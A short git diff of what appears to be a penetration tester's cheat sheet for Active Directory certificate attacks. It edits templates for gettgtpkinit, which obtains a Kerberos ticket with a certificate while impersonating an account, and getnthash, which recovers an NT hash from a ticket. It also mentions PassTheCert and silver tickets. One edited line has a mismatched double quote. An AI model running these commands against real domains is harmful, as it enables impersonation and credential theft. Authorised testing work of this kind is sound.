@@ -9,13 +9,13 @@ error "KDC has no support for PADATA type (pre-authentication data)" means DC do
 
 use PassTheCert.py to attack ldap with a cert but no tgt can be obtained
 ```
-gettgtpkinit -cert-pfx <pfx_file_> -pfx-pass <pfx_password|jubeaz> -dc-ip <dc_ip> <domain_fqdn>/<accountToImpersonate> <ccache_path>
+gettgtpkinit -cert-pfx ""$(pwd)/<pfx_file_>" -pfx-pass <pfx_password|jubeaz> -dc-ip <dc_ip> <domain_fqdn>/<accountToImpersonate> "$(pwd)/<ccache_name>".ccache
 ```
 
 ## hash from TGT and AS REP key
 #plateform/linux #target/remote #cat/RECON
 ```
-export KRB5CCNAME=<ccache> && getnthash <domain_fqdn>/<ComputerAccount> -key <key>
+export KRB5CCNAME="$(pwd)/<ccache_name>".ccache && getnthash <domain_fqdn>/<ComputerAccount> -key <key>
 ```
 
 ## silver ticket using a certificate
